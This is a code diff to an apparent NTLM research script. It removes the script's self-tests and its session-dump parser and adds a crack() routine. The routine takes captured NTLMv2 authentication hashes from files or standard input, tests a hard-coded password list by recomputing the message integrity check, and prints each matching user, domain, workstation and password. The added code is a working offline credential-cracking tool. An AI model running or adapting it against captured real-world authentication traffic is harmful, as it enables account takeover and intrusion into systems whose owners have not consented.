@@ -17,7 +17,6 @@ import pprint
 import secrets
 import struct
 import sys
-import unittest
 
 
 # ../FreeRDP-ResearchServer/winpr/libwinpr/sspi/NTLM/ntlm.h
@@ -825,34 +824,41 @@ def test_calculate_MIC():
 	assert actual == expected
 
 
+def crack(hash):
+	components = hash_decode(hash)
+
+	passwordList = [
+		"qwerty",
+		"password",
+		"secret",
+		"yoink",
+	]
+	mic = binascii.hexlify(components["MessageIntegrityCheck"]).decode()
+	for password in passwordList:
+		if components["MessageIntegrityCheck"] == calculate_MIC(
+			password.encode("utf-16le"),
+			components["UserDomain"],
+			components["ntlm_v2_temp_chal"],
+			components["msg"],
+			components["EncryptedRandomSessionKey"],
+		):
+			print(f'Success: {mic}:{components["domain"]}\\{components["user"]}@{components["workstation"]}:{password}')
+			break
+	else:
+		print(f'Fail: {mic}:{components["domain"]}\\{components["user"]}@{components["workstation"]}')
+
+
 if __name__ == "__main__":
-	test_NTOWFv2FromHashW()
-	test_winpr_HMAC()
-	test_ntlm_compute_message_integrity_check()
-	test_extract_hash()
-	test_calculate_MIC()
 	parser = argparse.ArgumentParser()
-	parser.add_argument("-d","--dir", help="directory containing dumps", default="dump")
-	parser.add_argument("sessions", help="parse these sessions", type=int, nargs="*")
+	parser.add_argument("hashes", help="crack these hashes", nargs="*")
 	args = parser.parse_args()
 
-	os.chdir(args.dir)
-
 	hashes = []
-	if args.sessions:
-		sessions = args.sessions
-	else:
-		matches = glob.glob("*.NegotiateIn.bin")
-		sessions = [s[:-len(".NegotiateIn.bin")] for s in matches]
-	for session in sessions:
-		session_files = [
-			f"{session}.NegotiateIn.bin",
-			f"{session}.ChallengeOut.bin",
-			f"{session}.ChallengeIn.bin",
-			f"{session}.AuthenticateOut.bin",
-			f"{session}.AuthenticateIn.bin",
-		]
+	for file in args.hashes:
+		with open(file, "r") as f:
+			hashes.extend(f.readlines())
+	if not args.hashes:
+		hashes = sys.stdin.readlines()
 
-		messages = parse_dumps(*session_files)
-		hash = generate_hash(messages)
-		print(hash)
+	for hash in hashes:
+		crack(hash)
